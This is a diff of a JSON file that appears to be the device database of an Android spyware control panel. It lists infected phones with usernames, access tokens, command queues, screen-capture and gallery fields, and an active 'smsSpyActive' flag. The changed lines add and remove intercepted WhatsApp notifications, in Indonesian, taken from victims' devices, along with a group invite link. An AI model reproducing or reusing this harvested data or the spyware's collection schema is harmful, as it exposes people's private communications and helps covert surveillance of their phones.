@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776775387486,
+    "lastSeen": 1776775390645,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3708 pesan dari 23 chat",
+        "time": "21/04 19:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775389968
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (77 pesan): ~ jall store",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:18",
         "pkg": "com.whatsapp",
         "receivedAt": 1776773928153
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (51 pesan): ~ Dika store",
-        "content": "🎥 𝚈𝙶 𝙼𝙰𝚄 𝙹𝚄𝙰𝙻 𝙰𝙺𝚄𝙽 𝙰𝚃𝙰𝚄 𝚈𝙶 𝙼𝙰𝚄 𝙲𝙰𝚁𝙸 𝙰𝙺𝚄𝙽 𝔻𝔸ℕ𝔸 ℙ𝔼𝕃𝔸𝕁𝔸ℝ 𝕊𝕋𝕆𝕂 𝕆ℙ𝕄 ℝ𝕀ℙ𝔼ℝ 𝕄𝕌𝕃𝔸𝕀 ℍ𝔸ℝ𝔾𝔸 𝟝𝟘--𝟙𝟘𝟘𝕂 𝙻𝙰𝙽𝙶𝚂𝚄𝙽𝙶 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙻𝙸𝙽𝙺 𝙳𝙸 𝙱𝚆𝙰𝙷⬇️  𝕐𝔾 𝔻𝕀 ℝ𝔼𝕂𝕆𝕄𝔼ℕ𝔻𝔸𝕊𝕀 𝕂𝔸ℕ ℙℙ 𝔹𝕆𝕄𝔼𝕃\n\nhttps://chat.whatsapp.com/G0NVym9VfV1B3eK6VhA1IU?mode=gi_t (0.16)",
-        "time": "21/04 19:18",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773928131
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775389449,
+    "lastSeen": 1776775391255,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775389448,
+    "lastSeen": 1776775392321,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776775389868,
+    "lastSeen": 1776775392029,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
